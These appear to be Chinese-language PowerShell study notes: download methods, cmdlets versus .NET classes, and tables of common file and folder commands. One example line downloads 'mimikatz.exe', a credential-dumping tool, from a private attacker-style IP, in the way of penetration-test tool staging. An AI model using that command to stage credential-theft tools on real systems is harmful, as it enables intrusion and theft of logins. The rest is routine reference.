# powershell

## 使用範例

### 使用 .net類別 下載檔案
```bash
powershell (New-Object System.Net.WebClient).DownloadFile(\"http://10.4.11.38:1234/mimikatz.exe\", \"mimikatz.exe\")
```
### 使用 cmdlet 下載檔案
```bash
Invoke-WebRequest -Uri "https://example.com/file.zip" -OutFile "file.zip"
# 或簡寫
iwr "https://example.com/file.zip" -OutFile file.zip
```


## 說明
1. cmdlet：PowerShell 的命令（由 PowerShell 實作），輸入輸出通常是 PowerShell 物件，例如 Invoke-WebRequest, Get-ChildItem。
2. .NET 類別：PowerShell 可以直接使用 .NET 類別與方法（因為 PowerShell 建立在 .NET 上），像 New-Object System.Net.WebClient 或 System.IO.File。這不是 cmdlet，而是呼叫類別的建構子與方法。

### 🧾 PowerShell 檔案與資料夾常用指令速查表

| 指令                                            | 功能說明                   | 常用參數                                                                           | 範例                                                                                             |
| ----------------------------------------------- | -------------------------- | ---------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------ |
| **`Get-ChildItem`**（簡寫：`gci`、`ls`、`dir`） | 列出資料夾或檔案           | `-Path` 指定路徑<br>`-Recurse` 遞迴顯示子目錄<br>`-Filter` 篩選條件                | `Get-ChildItem C:\Users`<br>`Get-ChildItem -Path . -Recurse -Filter *.txt`                       |
| **`Copy-Item`**（簡寫：`cp`、`copy`）           | 複製檔案或資料夾           | `-Path` 來源路徑<br>`-Destination` 目標位置<br>`-Recurse` 包含子目錄               | `Copy-Item C:\test\file.txt D:\backup\`<br>`Copy-Item .\data -Destination D:\backup -Recurse`    |
| **`Move-Item`**（簡寫：`mv`、`move`）           | 移動或重新命名檔案／資料夾 | `-Path` 來源<br>`-Destination` 目標                                                | `Move-Item C:\log.txt D:\archive\`<br>`Move-Item oldname.txt newname.txt`                        |
| **`Remove-Item`**（簡寫：`rm`、`del`、`erase`） | 刪除檔案或資料夾           | `-Path` 指定目標<br>`-Recurse` 刪除子目錄<br>`-Force` 強制刪除（例如隱藏或唯讀檔） | `Remove-Item C:\temp\*.log`<br>`Remove-Item C:\backup -Recurse -Force`                           |
| **`New-Item`**（簡寫：`ni`）                    | 建立新檔案或資料夾         | `-ItemType` `File` 或 `Directory`<br>`-Path` 路徑                                  | `New-Item -Path C:\notes.txt -ItemType File`<br>`New-Item -Path C:\MyFolder -ItemType Directory` |
| **`Test-Path`**                                 | 測試檔案或資料夾是否存在   | `-Path` 路徑                                                                       | `Test-Path C:\Windows` → 回傳 `True` 或 `False`                                                  |
| **`Get-Item`**（簡寫：`gi`）                    | 取得單一檔案或資料夾物件   | `-Path` 路徑                                                                       | `Get-Item C:\Users\Public\file.txt`                                                              |
| **`Set-Location`**（簡寫：`cd`、`chdir`、`sl`） | 變更目前所在目錄           | `-Path` 目標路徑                                                                   | `Set-Location C:\Users`                                                                          |
| **`Get-Location`**（簡寫：`pwd`、`gl`）         | 顯示目前目錄路徑           | —                                                                                  | `Get-Location`                                                                                   |
| **`Rename-Item`**（簡寫：`ren`、`rni`）         | 重新命名檔案或資料夾       | `-Path` 原名稱<br>`-NewName` 新名稱                                                | `Rename-Item -Path old.txt -NewName new.txt`                                                     |
| **`Clear-Item`**                                | 清空檔案內容（不刪檔案）   | `-Path`                                                                            | `Clear-Item C:\test\log.txt`                                                                     |
| **`Get-Content`**（簡寫：`gc`）                 | 讀取檔案內容               | `-Path`                                                                            | `Get-Content C:\test\log.txt`                                                                    |
| **`Set-Content`**（簡寫：`sc`）                 | 覆寫檔案內容               | `-Path`、`-Value`                                                                  | `Set-Content C:\test\log.txt "Hello World"`                                                      |
| **`Add-Content`**（簡寫：`ac`）                 | 附加內容至檔案             | `-Path`、`-Value`                                                                  | `Add-Content C:\test\log.txt "New line"`                                                         |

---

### 💡 常見用途範例

| 任務                           | 範例指令                                        |
| ------------------------------ | ----------------------------------------------- |
| 顯示目前資料夾所有檔案         | `ls`                                            |
| 顯示所有子資料夾中的 `.log` 檔 | `Get-ChildItem -Recurse -Filter *.log`          |
| 複製整個資料夾（含子資料夾）   | `Copy-Item .\data D:\backup -Recurse`           |
| 移動並重新命名檔案             | `Move-Item report.txt D:\backup\report_old.txt` |
| 刪除所有 `.tmp` 檔案           | `Remove-Item *.tmp`                             |
| 檢查檔案是否存在               | `Test-Path .\config.json`                       |
| 建立資料夾                     | `New-Item -Path .\output -ItemType Directory`   |
| 顯示目前目錄                   | `pwd`                                           |
| 讀取檔案內容                   | `Get-Content notes.txt`                         |
| 附加內容到檔案尾端             | `Add-Content notes.txt "Done"`                  |

---

